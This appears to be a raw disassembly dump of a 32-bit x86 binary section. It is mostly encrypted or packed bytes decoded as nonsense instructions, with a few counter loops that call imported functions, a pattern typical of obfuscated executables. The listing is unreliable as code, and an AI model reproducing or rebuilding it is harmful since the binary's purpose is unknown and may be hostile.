  402120:	push   edx
  402121:	sub    edx,DWORD PTR [esi+0x6]
  402124:	xchg   BYTE PTR [edx],dl
  402126:	inc    ebp
  402127:	out    0x77,al
  402129:	sbb    al,0x46
  40212b:	dec    esp
  40212c:	jns    0x402162
  40212e:	pop    esi
  40212f:	pusha  
  402130:	and    eax,ecx
  402132:	mov    ecx,0x4e1bd1bf
  402137:	test   BYTE PTR [ebp-0x31464b3b],0x8b
  40213e:	test   BYTE PTR fs:[edi-0x1e],dh
  402142:	cld    
  402143:	pop    esp
  402144:	xchg   DWORD PTR [edi-0x1fe3d981],ebp
  40214a:	mov    esi,0x33e634f4
  40214f:	sbb    al,BYTE PTR [edx-0x1278616a]
  402155:	imul   esi,DWORD PTR [esi+0x5ef430ce],0xb908755a
  40215f:	adc    eax,0xa828ea76
  402164:	mov    DWORD PTR [ebx+0x2c],0x1624cc04
  40216b:	fnstenv [ebx+0x29]
  40216e:	mov    esi,0xe4ef0640
  402173:	mov    ah,0x5c
  402175:	push   edx
  402176:	mov    ds:0x60c7ec44,al
  40217b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40217c:	xchg   ecx,eax
  40217d:	neg    BYTE PTR [eax+0x620ade96]
  402183:	in     al,0x27
  402185:	stos   BYTE PTR es:[edi],al
  402186:	rcl    BYTE PTR [ebp+0x12],cl
  402189:	push   esp
  40218a:	mov    ah,bh
  40218c:	dec    ebp
  40218d:	aam    0x21
  40218f:	mov    esp,0x4a24b9f6
  402194:	mov    DWORD PTR es:[esi-0x2278b0b0],esi
  40219b:	push   ss
  40219c:	mov    al,0x4a
  40219e:	sbb    bh,cl
  4021a0:	xchg   esp,eax
  4021a1:	daa    
  4021a2:	dec    eax
  4021a3:	cmp    eax,0x8e499cad
  4021a8:	loope  0x4021e1
  4021aa:	mov    al,ds:0xaa15881b
  4021af:	hlt    
  4021b0:	mov    edi,0xc5f5e210
  4021b5:	mov    ds:0x1f23e56b,al
  4021ba:	arpl   WORD PTR [ebx-0x48],ax
  4021bd:	not    ah
  4021bf:	push   0xffffff93
  4021c1:	shl    BYTE PTR [edi-0x20],cl
  4021c4:	sub    al,0x1b
  4021c6:	adc    BYTE PTR [ecx+edx*4+0x3370a48c],al
  4021cd:	jb     0x4021b5
  4021cf:	mov    al,ds:0x18f18d18
  4021d4:	dec    eax
  4021d5:	das    
  4021d6:	cmp    ah,BYTE PTR [eax+0x7fb5860e]
  4021dc:	pop    edx
  4021dd:	out    0x60,eax
  4021df:	aam    0x98
  4021e1:	push   esp
  4021e2:	pop    edi
  4021e4:	int    0x98
  4021e6:	push   es
  4021e7:	pop    ss
  4021e8:	cwde   
  4021e9:	xor    al,0xc
  4021eb:	adc    DWORD PTR [edx],ebx
  4021ed:	rcl    DWORD PTR [edi-0x2867b45e],1
  4021f3:	cli    
  4021f4:	xchg   edx,eax
  4021f5:	ja     0x402196
  4021f7:	sub    esp,DWORD PTR [ebx]
  4021f9:	icebp  
  4021fa:	xor    al,0x53
  4021fc:	test   eax,0xf80ced70
  402201:	imul   ebx,esi,0x5fd7f2f5
  402207:	out    0xf5,eax
  402209:	ins    DWORD PTR es:[edi],dx
  40220a:	mov    BYTE PTR [edi-0x73],0x99
  40220e:	and    BYTE PTR [ebx-0x3f],ah
  402211:	repnz aaa 
  402213:	dec    edx
  402214:	inc    ebx
  402215:	and    bl,ah
  402217:	mov    cs,WORD PTR [eax-0xb]
  40221a:	inc    edx
  40221b:	icebp  
  40221c:	add    ebp,DWORD PTR ds:[ebp+ebp*1-0x61ac7159]
  402224:	push   0xffffff86
  402226:	test   ecx,esi
  402228:	scas   eax,DWORD PTR es:[edi]
  402229:	in     eax,dx
  40222a:	loope  0x4021e4
  40222c:	cmp    ebx,ecx
  40222e:	sbb    DWORD PTR [esi+0x74],edx
  402231:	and    eax,0xe91673a3
  402236:	xchg   esp,eax
  402237:	dec    esi
  402238:	lahf   
  402239:	fstp   TBYTE PTR [esi-0x3]
  40223c:	push   edx
  40223d:	pop    ss
  40223e:	xchg   edx,eax
  40223f:	adc    eax,0x85059ac8
  402244:	pop    edi
  402245:	jae    0x402216
  402247:	adc    DWORD PTR [ebp+0x6e],ebx
  40224a:	les    ecx,FWORD PTR [ecx]
  40224c:	cli    
  40224d:	add    al,0xf
  40224f:	inc    ebx
  402250:	fild   WORD PTR [edi+0x54]
  402253:	out    0x2a,al
  402255:	jnp    0x402282
  402257:	adc    esp,DWORD PTR [esi]
  402259:	inc    edx
  40225a:	push   ss
  40225b:	lahf   
  40225c:	inc    edi
  40225d:	and    BYTE PTR [edi-0x51],al
  402260:	call   0x9cddf03e
  402265:	rcr    DWORD PTR [esi],cl
  402267:	fs mov bl,0x7e
  40226a:	sub    esp,0xffffff8e
  40226d:	or     eax,0x374cbad2
  402272:	sub    eax,0x6d963bc0
  402277:	and    bl,bh
  402279:	daa    
  40227a:	jp     0x4022c2
  40227c:	pop    es
  40227d:	scas   al,BYTE PTR es:[edi]
  40227e:	inc    ebx
  40227f:	jno    0x402267
  402281:	xor    DWORD PTR [ebx+0x5dde99f4],0x37
  402288:	pop    ss
  402289:	fst    QWORD PTR [esi]
  40228b:	add    al,0x23
  40228d:	sti    
  40228e:	xchg   ecx,eax
  40228f:	mov    edi,0xcbefa589
  402294:	(bad)  [eax-0x7d]
  402297:	xchg   DWORD PTR [eax-0x6affac39],ecx
  40229d:	and    eax,0xc203b0c7
  4022a2:	nop
  4022a3:	inc    edi
  4022a4:	sbb    DWORD PTR [ebx-0x3ba6a126],ebp
  4022aa:	repz adc BYTE PTR ds:0x1199f93f,cl
  4022b1:	(bad)  
  4022b2:	ins    DWORD PTR es:[edi],dx
  4022b3:	lea    edi,[esi+edx*4-0x71]
  4022b7:	test   BYTE PTR [edx+ebp*4+0x8f91d54],al
  4022be:	push   cs
  4022bf:	mov    DWORD PTR [esi+ebp*4],edi
  4022c2:	adc    esp,DWORD PTR [ebx+0x11]
  4022c5:	and    edx,DWORD PTR [ebp-0x58]
  4022c8:	adc    eax,DWORD PTR [esi+0x258151bb]
  4022ce:	outs   dx,DWORD PTR ds:[esi]
  4022cf:	in     al,dx
  4022d0:	inc    edx
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [eax],al
  4022d5:	add    BYTE PTR [ebx+0x42ec6f15],cl
  4022db:	add    BYTE PTR [edx-0x77],al
  4022de:	adc    eax,0x42ec6f
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	ins    BYTE PTR es:[edi],dx
  402362:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402364:	jb     0x402341
  402366:	add    edi,DWORD PTR [esi+0x7e]
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x402327
  40236e:	mov    ebp,0xb036cbdc
  402373:	jbe    0x4023c2
  402375:	or     BYTE PTR [ebx],cl
  402377:	sbb    BYTE PTR [ebx+0x9],0x7
  40237b:	mov    ah,0xbb
  40237d:	ret    0x5d3a
  402380:	adc    ecx,DWORD PTR [esp+esi*4-0x31]
  402384:	xchg   ebx,eax
  402385:	inc    dl
  402387:	lahf   
  402388:	xor    dl,BYTE PTR [ebx-0xf]
  40238b:	xor    al,BYTE PTR [ebx+0x668e6121]
  402391:	cli    
  402392:	jecxz  0x402387
  402394:	inc    edx
  402395:	call   0xd485392b
  40239a:	push   0x9c36ad84
  40239f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023a0:	mov    cl,0xeb
  4023a2:	sbb    eax,0x46bbbdb6
  4023a7:	dec    ebp
  4023a8:	lds    ebp,FWORD PTR [edi-0x4f705ca3]
  4023ae:	mov    ecx,0x40e48e77
  4023b3:	mov    ebx,DWORD PTR [ecx]
  4023b5:	jle    0x402436
  4023b7:	fiadd  DWORD PTR [eax+eiz*1]
  4023ba:	mov    cl,0xab
  4023bc:	adc    al,0x1c
  4023be:	dec    ebx
  4023bf:	and    eax,0x8eec69b5
  4023c4:	test   eax,0x5f762750
  4023c9:	scas   eax,DWORD PTR es:[edi]
  4023ca:	mov    esi,0xca793c6
  4023cf:	fwait
  4023d0:	shl    dl,0xfe
  4023d3:	aam    0x66
  4023d5:	mul    BYTE PTR [ebp-0x1f7881c]
  4023db:	repnz push ebx
  4023dd:	aaa    
  4023de:	mov    bh,0x77
  4023e0:	jp     0x4023c0
  4023e2:	iret   
  4023e3:	test   eax,0xa0cff96f
  4023e8:	(bad)  
  4023e9:	xor    ch,al
  4023eb:	push   edx
  4023ec:	inc    edi
  4023ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ee:	(bad)  
  4023ef:	retf   0x5c01
  4023f2:	sub    esi,ebx
  4023f4:	retf   
  4023f5:	mov    esi,0x2be91a98
  4023fa:	inc    edi
  4023fb:	cs sbb eax,esp
  4023fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ff:	enter  0xff41,0x78
  402403:	xchg   esi,eax
  402404:	and    al,0xad
  402406:	cli    
  402407:	xchg   ecx,eax
  402408:	adc    eax,0x68760156
  40240d:	ja     0x4023a5
  40240f:	xchg   ecx,eax
  402410:	out    dx,eax
  402411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402412:	pop    esp
  402413:	test   DWORD PTR [ecx+0x75],eax
  402416:	sub    cl,BYTE PTR [esi+0x1d38cfad]
  40241c:	fidivr WORD PTR [edx+0x6c189b96]
  402422:	or     DWORD PTR [edx+eiz*4+0x4524760c],edx
  402429:	and    al,0x3d
  40242b:	inc    eax
  40242c:	cwde   
  40242d:	pop    DWORD PTR [edi+0x75]
  402430:	outs   dx,BYTE PTR ds:[esi]
  402431:	mov    esi,0xb318f3f8
  402436:	jmp    0xb82adbd
  40243b:	add    al,0x55
  40243d:	or     BYTE PTR [edi+0x58d5ac37],bl
  402443:	stos   BYTE PTR es:[edi],al
  402444:	lods   eax,DWORD PTR ss:[esi]
  402446:	add    DWORD PTR [esi],ecx
  402448:	test   DWORD PTR [ecx+0x3a],esi
  40244b:	sub    BYTE PTR [edx-0x7],bl
  40244e:	and    eax,0x4616943a
  402453:	pop    DWORD PTR [ebp+0x5d]
  402456:	stc    
  402457:	fadd   st,st(5)
  402459:	out    0xd3,eax
  40245b:	inc    ecx
  40245c:	ret    
  40245d:	and    cl,BYTE PTR [edi]
  40245f:	in     al,0x94
  402461:	pop    edx
  402462:	add    eax,0x3cbbbb28
  402467:	mov    bl,0x9b
  402469:	shr    DWORD PTR [edi+ebx*2-0x2689f15f],1
  402470:	mov    ah,0x21
  402472:	iret   
  402473:	sti    
  402474:	pushf  
  402475:	daa    
  402476:	xchg   esp,eax
  402477:	mov    ds:0xdab4ca1c,al
  40247c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40247d:	jns    0x40240a
  40247f:	xchg   edx,eax
  402480:	sar    DWORD PTR [edx+0x926c17b],1
  402486:	(bad)  
  402487:	es jns 0x402441
  40248a:	dec    esi
  40248b:	pop    es
  40248c:	pop    esp
  40248d:	xor    bl,0x89
  402490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402491:	es sub edx,edx
  402494:	add    bl,BYTE PTR [ecx-0x16]
  402497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402498:	xchg   esp,eax
  402499:	inc    esi
  40249a:	out    dx,eax
  40249b:	dec    edi
  40249c:	mov    dh,0x7d
  40249e:	test   BYTE PTR [edx+0x19],dl
  4024a1:	mov    cl,0x1
  4024a3:	into   
  4024a4:	xchg   esp,eax
  4024a5:	push   edx
  4024a6:	push   cs
  4024a7:	dec    ebp
  4024a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a9:	push   0x84426142
  4024ae:	xchg   BYTE PTR [edi*8+0x138e1e20],ah
  4024b5:	mov    bh,0xb4
  4024b7:	mov    dh,0x4f
  4024b9:	push   cs
  4024ba:	bound  edi,QWORD PTR [esi-0x7f]
  4024bd:	cdq    
  4024be:	popa   
  4024bf:	(bad)  
  4024c0:	out    dx,eax
  4024c1:	pop    ds
  4024c2:	ds jo  0x4024f4
  4024c5:	popf   
  4024c6:	fwait
  4024c7:	mov    BYTE PTR [eax+eiz*8],0xd
  4024cb:	into   
  4024cc:	loopne 0x402499
  4024ce:	div    BYTE PTR [ecx]
  4024d0:	push   ds
  4024d1:	or     ah,al
  4024d3:	pop    edx
  4024d4:	icebp  
  4024d5:	stos   BYTE PTR es:[edi],al
  4024d6:	fs inc ebp
  4024d8:	in     eax,0xff
  4024da:	push   esp
  4024db:	sub    eax,esp
  4024dd:	sbb    al,0xef
  4024df:	ja     0x4024da
  4024e1:	lods   eax,DWORD PTR ds:[esi]
  4024e2:	fs out 0x49,eax
  4024e5:	out    dx,al
  4024e6:	inc    edi
  4024e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024e8:	int3   
  4024e9:	xlat   BYTE PTR ds:[ebx]
  4024ea:	in     al,0x9c
  4024ec:	push   0x4eef1341
  4024f1:	push   esi
  4024f2:	cmp    DWORD PTR [edx-0x8],0xd958e28c
  4024f9:	mov    al,0x8c
  4024fb:	sub    al,0x3a
  4024fd:	jae    0x4024ae
  4024ff:	fmul   QWORD PTR [esi+0x36]
  402502:	cld    
  402503:	pop    edx
  402504:	mov    BYTE PTR [ecx],ch
  402506:	mov    al,ds:0x53f984e2
  40250b:	out    dx,eax
  40250c:	jno    0x40258d
  40250e:	mov    ebx,0x56263a51
  402513:	retf   0x15d3
  402516:	push   0xfff477e
  40251b:	pop    edx
  40251c:	shl    BYTE PTR [edx],cl
  40251e:	or     al,0x13
  402520:	aam    0xd5
  402522:	jmp    0xa0c94b08
  402527:	icebp  
  402528:	retf   
  402529:	jmp    0x402506
  40252b:	loope  0x402593
  40252d:	fimul  WORD PTR [ecx]
  40252f:	or     BYTE PTR [eax+0x3199b509],cl
  402535:	and    eax,0x68897963
  40253a:	shl    DWORD PTR [eax],cl
  40253c:	or     ecx,eax
  40253e:	pushf  
  40253f:	rol    BYTE PTR [esi+0x59],0x95
  402543:	fmul   DWORD PTR [edi]
  402545:	loope  0x40252d
  402547:	or     edx,DWORD PTR [ecx-0x7f]
  40254a:	and    eax,0x42ec4b
  40254f:	cmp    DWORD PTR [ebx],esi
  402551:	add    BYTE PTR [eax],al
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	add    edx,DWORD PTR fs:[esi+ebp*8]
  402615:	retf   
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x402664
  40261f:	lahf   
  402620:	push   es
  402621:	ss cld 
  402623:	scas   eax,DWORD PTR es:[edi]
  402624:	jecxz  0x402621
  402626:	lods   al,BYTE PTR ds:[esi]
  402627:	test   DWORD PTR [ecx+eiz*1+0x1d],0x40992974
  40262f:	sbb    al,ch
  402631:	mov    dh,BYTE PTR [ebp-0x1a919bba]
  402637:	sub    ebp,esi
  402639:	inc    ecx
  40263a:	sti    
  40263b:	shl    esp,cl
  40263d:	cmp    esi,ebx
  40263f:	sub    BYTE PTR ds:0x240718d0,dh
  402645:	call   0xe526:0xf81f9642
  40264c:	mov    dl,0x1
  40264e:	daa    
  40264f:	pop    esi
  402650:	mov    ds:0xa19bba83,al
  402655:	in     eax,0x18
  402657:	jl     0x402649
  402659:	retf   0xcb85
  40265c:	mov    bl,0x2d
  40265e:	push   ecx
  40265f:	aad    0x6c
  402661:	lahf   
  402662:	rcl    BYTE PTR [edx-0xc],1
  402665:	inc    esi
  402666:	and    bh,bh
  402668:	rol    bl,1
  40266a:	or     DWORD PTR [edi],ebx
  40266c:	cmp    edx,esi
  40266e:	cmp    ah,dl
  402670:	mov    edi,0x6874727b
  402675:	(bad)  
  402676:	sar    DWORD PTR [esi+0x70],1
  402679:	mov    ecx,0xa21e5746
  40267e:	ficomp DWORD PTR [esi+0x38]
  402681:	pushf  
  402682:	ret    0x30d5
  402685:	pop    edx
  402686:	fyl2xp1 
  402688:	inc    edi
  402689:	pop    ecx
  40268a:	icebp  
  40268b:	push   ds
  40268c:	rcr    BYTE PTR [esi+edx*8],cl
  40268f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402690:	mov    ds:0xbf9d0276,al
  402695:	pop    ss
  402696:	sahf   
  402697:	pop    ds
  402698:	jmp    0x402707
  40269a:	pusha  
  40269b:	mov    al,ds:0xe15d34ba
  4026a0:	call   0x7c7b93f3
  4026a5:	in     eax,dx
  4026a6:	cmp    BYTE PTR [ebx],0xbb
  4026a9:	cwde   
  4026aa:	(bad)  
  4026ab:	fistp  QWORD PTR [esi+edx*2]
  4026ae:	or     BYTE PTR [eax-0x73],dl
  4026b1:	fistp  DWORD PTR [eax-0x61]
  4026b4:	add    DWORD PTR [edi],edi
  4026b6:	aas    
  4026b7:	out    dx,al
  4026b8:	adc    BYTE PTR [ecx+0x6468d653],ah
  4026be:	out    dx,al
  4026bf:	loope  0x4026a1
  4026c1:	add    dl,bh
  4026c3:	call   0x8db44734
  4026c8:	sub    bh,al
  4026ca:	pop    es
  4026cb:	sbb    BYTE PTR [eax+0x57137e0a],ch
  4026d1:	jnp    0x4026bf
  4026d3:	cwde   
  4026d4:	mov    ebp,DWORD PTR [ecx]
  4026d6:	xor    ebx,DWORD PTR [eax]
  4026d8:	(bad)  [edx-0x41a7626d]
  4026de:	cmp    al,0xfc
  4026e0:	or     dl,BYTE PTR [esi+eiz*8-0x30601d5c]
  4026e7:	pop    edi
  4026e8:	pop    ecx
  4026e9:	sti    
  4026ea:	std    
  4026eb:	push   edx
  4026ec:	ins    BYTE PTR es:[edi],dx
  4026ed:	icebp  
  4026ee:	jg     0x4026c8
  4026f0:	nop
  4026f1:	lahf   
  4026f2:	adc    eax,DWORD PTR [esi]
  4026f4:	neg    DWORD PTR es:[eax+0x7e35ddf5]
  4026fb:	dec    ebx
  4026fc:	sbb    eax,0x8a3d572d
  402701:	or     DWORD PTR [edi],0xbdafd968
  402707:	or     BYTE PTR fs:[ecx-0x52b76fe6],bh
  40270e:	aas    
  40270f:	jge    0x402709
  402711:	inc    ebx
  402712:	dec    ebx
  402713:	lods   al,BYTE PTR ds:[esi]
  402714:	out    dx,al
  402715:	sub    al,0x51
  402717:	aas    
  402718:	jbe    0x4026f8
  40271a:	ror    BYTE PTR [esi-0x397bbf41],cl
  402720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402721:	or     esi,DWORD PTR [edi]
  402723:	sbb    BYTE PTR [ebx],dl
  402725:	add    esp,edx
  402727:	loop   0x402767
  402729:	dec    BYTE PTR [edx+edi*1-0x41]
  40272d:	cwde   
  40272e:	arpl   WORD PTR [edx*1+0xb4f6c99],di
  402735:	mov    ebp,0xc49286ba
  40273a:	add    eax,0x427657e9
  40273f:	dec    ecx
  402740:	mov    bl,0xf0
  402742:	sbb    dh,dh
  402744:	sbb    DWORD PTR [esi-0x201947f6],eax
  40274a:	mov    ebx,0xb43f93df
  40274f:	cmp    eax,DWORD PTR [edi+eax*4+0x66]
  402753:	xor    esi,esp
  402755:	std    
  402756:	cdq    
  402757:	sub    eax,0x4879d9e9
  40275c:	stos   BYTE PTR es:[edi],al
  40275d:	add    ebx,0xffffffc1
  402760:	sti    
  402761:	stos   DWORD PTR es:[edi],eax
  402762:	cmp    al,0xb9
  402764:	cmp    BYTE PTR [ebx+0x7d],0xc4
  402768:	dec    esp
  402769:	pusha  
  40276a:	stos   BYTE PTR es:[edi],al
  40276b:	mov    al,0xdd
  40276d:	add    BYTE PTR [ebp-0x11b40aaf],dh
  402773:	add    BYTE PTR [edi-0x4c129324],bl
  402779:	ret    0xa9d1
  40277c:	or     DWORD PTR [ecx],0xffffff87
  40277f:	inc    edx
  402780:	sub    eax,0x943579bf
  402785:	push   esi
  402786:	cmp    dl,BYTE PTR [ebx+0x47]
  402789:	xchg   ebx,eax
  40278a:	pop    esi
  40278b:	repnz cmp eax,0xdaafe682
  402791:	cmp    cl,BYTE PTR [edx]
  402793:	pop    ebp
  402794:	imul   esp,ecx,0xffffffa5
  402797:	pop    esp
  402798:	into   
  402799:	iret   
  40279a:	clc    
  40279b:	mov    ch,0x98
  40279d:	int    0x81
  40279f:	stos   DWORD PTR es:[edi],eax
  4027a0:	dec    ecx
  4027a1:	xor    cl,BYTE PTR [esi-0x58187559]
  4027a7:	push   edi
  4027a8:	jg     0x402768
  4027aa:	mov    edi,0x244b4ae0
  4027af:	sbb    BYTE PTR [edi-0x6f],cl
  4027b2:	pusha  
  4027b3:	popa   
  4027b4:	xchg   BYTE PTR [ebp-0x26],cl
  4027b7:	dec    ebp
  4027b8:	xor    ebp,edx
  4027ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027bb:	inc    ebp
  4027bc:	outs   dx,BYTE PTR ds:[esi]
  4027bd:	inc    edx
  4027be:	and    cl,BYTE PTR [eax]
  4027c0:	sbb    edi,DWORD PTR [esp+esi*4-0x54e023ea]
  4027c7:	pop    ebx
  4027c8:	(bad)  
  4027ca:	push   edx
  4027cb:	inc    edi
  4027cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027cd:	fdiv   QWORD PTR [esi+edi*8]
  4027d0:	inc    esp
  4027d1:	ins    BYTE PTR es:[edi],dx
  4027d2:	xchg   edx,eax
  4027d3:	xchg   BYTE PTR [edi-0x7a3ea0e2],bl
  4027d9:	pop    edx
  4027da:	mov    edx,0xbe9023bb
  4027df:	adc    BYTE PTR [edi-0x7a5a9fdb],dh
  4027e5:	(bad)  
  4027e6:	adc    DWORD PTR [ebp-0x70ecd76c],ebx
  4027ec:	int3   
  4027ed:	jecxz  0x4027df
  4027ef:	in     eax,dx
  4027f0:	call   0xdeb437b2
  4027f5:	popf   
  4027f6:	in     al,dx
  4027f7:	scas   al,BYTE PTR es:[edi]
  4027f8:	fist   DWORD PTR [edi-0x75]
  4027fb:	jge    0x40280d
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edi+eiz*1-0x38],esp
  40282a:	pop    ecx
  40282b:	adc    eax,0x557e7e0f
  402830:	jg     0x4028b0
  402832:	jle    0x402882
  402834:	pop    eax
  402835:	rol    BYTE PTR [ebx-0x1e0024e1],0x61
  40283c:	inc    edi
  40283d:	pushf  
  40283e:	fsubr  QWORD PTR [edi-0xc]
  402841:	dec    eax
  402842:	dec    edx
  402843:	or     ebp,DWORD PTR [ebx+0x24fec216]
  402849:	sahf   
  40284a:	nop
  40284b:	jae    0x4028a6
  40284d:	jb     0x40287a
  40284f:	jns    0x402810
  402851:	and    ebp,DWORD PTR [ebp+0x4e]
  402854:	pusha  
  402855:	sub    eax,0x3905e1ce
  40285a:	cmp    DWORD PTR [edi-0x4],eax
  40285d:	mov    esp,ecx
  40285f:	push   esi
  402860:	in     eax,dx
  402861:	cmc    
  402862:	dec    edx
  402863:	mov    eax,ds:0x170bd498
  402868:	mov    cl,0x21
  40286a:	pop    esp
  40286b:	sbb    dh,bl
  40286d:	and    eax,0x8f5abb95
  402872:	mov    dl,BYTE PTR [esi-0x6e]
  402875:	xor    ah,0xd5
  402878:	sahf   
  402879:	sub    BYTE PTR [eax],bl
  40287b:	cwde   
  40287c:	sub    eax,0xcc62a202
  402881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402882:	stos   DWORD PTR es:[edi],eax
  402883:	mov    eax,ds:0xb2e32b72
  402888:	psubsb mm2,mm6
  40288b:	sar    bl,cl
  40288d:	mov    eax,0xa8f8e127
  402892:	jmp    0xde1388d9
  402897:	daa    
  402898:	adc    ah,BYTE PTR [ebx+0x4521fa28]
  40289e:	loopne 0x40287f
  4028a0:	xchg   edx,eax
  4028a1:	adc    eax,0x7b46ede1
  4028a6:	mov    bh,0xfa
  4028a8:	out    dx,al
  4028a9:	pushf  
  4028aa:	daa    
  4028ab:	les    esp,FWORD PTR [edi-0xfcff7f5]
  4028b1:	sub    eax,0xce67b41b
  4028b6:	jb     0x4028b9
  4028b8:	test   bl,cl
  4028ba:	shr    edi,0x4d
  4028bd:	xor    bh,bl
  4028bf:	scas   eax,DWORD PTR es:[edi]
  4028c0:	sub    eax,DWORD PTR [esi-0x6d]
  4028c3:	out    dx,eax
  4028c4:	dec    edx
  4028c5:	xchg   esp,eax
  4028c6:	jge    0x402913
  4028c8:	pop    ebx
  4028c9:	into   
  4028ca:	xlat   BYTE PTR ds:[ebx]
  4028cb:	push   eax
  4028cc:	int3   
  4028cd:	or     al,0x79
  4028cf:	push   0xfe0cad5e
  4028d4:	cmp    edx,edx
  4028d6:	add    al,0xb4
  4028d8:	(bad)  
  4028d9:	imul   esi,DWORD PTR [edx],0x287fc11f
  4028df:	lock stc 
  4028e1:	test   BYTE PTR [ecx],dl
  4028e3:	repnz pushf 
  4028e5:	adc    eax,0xb348cf75
  4028ea:	mov    dl,0x44
  4028ec:	cmp    eax,0x81cdc89b
  4028f1:	xchg   esi,eax
  4028f2:	cmp    eax,0xe4d4969
  4028f7:	xlat   BYTE PTR ds:[ebx]
  4028f8:	retf   
  4028f9:	adc    al,0xc7
  4028fb:	mov    ebp,0x854427f2
  402900:	sub    BYTE PTR [esi+0x1e],bl
  402903:	out    0x7e,al
  402905:	pop    ecx
  402906:	sub    bh,BYTE PTR [esi+0x1db0dc98]
  40290c:	pop    edx
  40290d:	dec    eax
  40290e:	aas    
  40290f:	jmp    0x825cb932
  402914:	pushf  
  402915:	add    eax,0x72b0addd
  40291a:	jae    0x402904
  40291c:	cwde   
  40291d:	xchg   ebx,eax
  40291e:	pop    ds
  40291f:	stc    
  402920:	cmp    DWORD PTR [ebp-0x6d1a86dc],0x33e73c9f
  40292a:	sbb    ecx,DWORD PTR [ebp+0x7fbb41e1]
  402930:	inc    eax
  402931:	pop    ss
  402932:	test   cl,ah
  402934:	push   esi
  402935:	or     eax,0xc9eadf
  40293a:	pop    ebp
  40293b:	jo     0x4028c7
  40293d:	out    0xb8,al
  40293f:	ficom  WORD PTR [esi+ebp*8]
  402942:	stc    
  402943:	les    esi,FWORD PTR [edx+0xc]
  402946:	clc    
  402947:	sub    eax,0x9e817ea1
  40294c:	out    dx,al
  40294d:	pusha  
  40294e:	mov    ah,0x6b
  402950:	lods   al,BYTE PTR ds:[esi]
  402951:	xlat   BYTE PTR ds:[ebx]
  402952:	mov    ebp,0x9a3e1c71
  402957:	pop    eax
  402958:	cmp    al,0x15
  40295a:	popa   
  40295b:	push   esi
  40295c:	lods   eax,DWORD PTR ds:[esi]
